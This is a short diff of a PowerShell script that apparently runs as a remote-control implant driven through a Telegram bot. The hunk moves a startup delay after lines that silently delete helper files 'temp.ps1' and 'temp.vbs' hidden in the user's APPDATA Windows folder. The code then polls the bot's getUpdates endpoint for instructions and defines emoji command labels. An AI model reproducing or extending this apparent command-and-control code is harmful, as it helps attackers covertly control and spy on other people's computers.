@@ -34,11 +34,11 @@ $glass = [char]::ConvertFromUtf32(0x1F50D)
 $cmde = [char]::ConvertFromUtf32(0x1F517)
 $pause = [char]::ConvertFromUtf32(0x23F8)
 
-# Startup Delay
-Sleep 10
 # remove pause files
 if(Test-Path "$env:APPDATA\Microsoft\Windows\temp.ps1"){rm -path "$env:APPDATA\Microsoft\Windows\temp.ps1" -Force}
 if(Test-Path "$env:APPDATA\Microsoft\Windows\temp.vbs"){rm -path "$env:APPDATA\Microsoft\Windows\temp.vbs" -Force}
+# Startup Delay
+Sleep 10
 # Get Chat ID from the bot
 $updates = Invoke-RestMethod -Uri ($url + "/getUpdates")
 if ($updates.ok -eq $true) {$latestUpdate = $updates.result[-1]
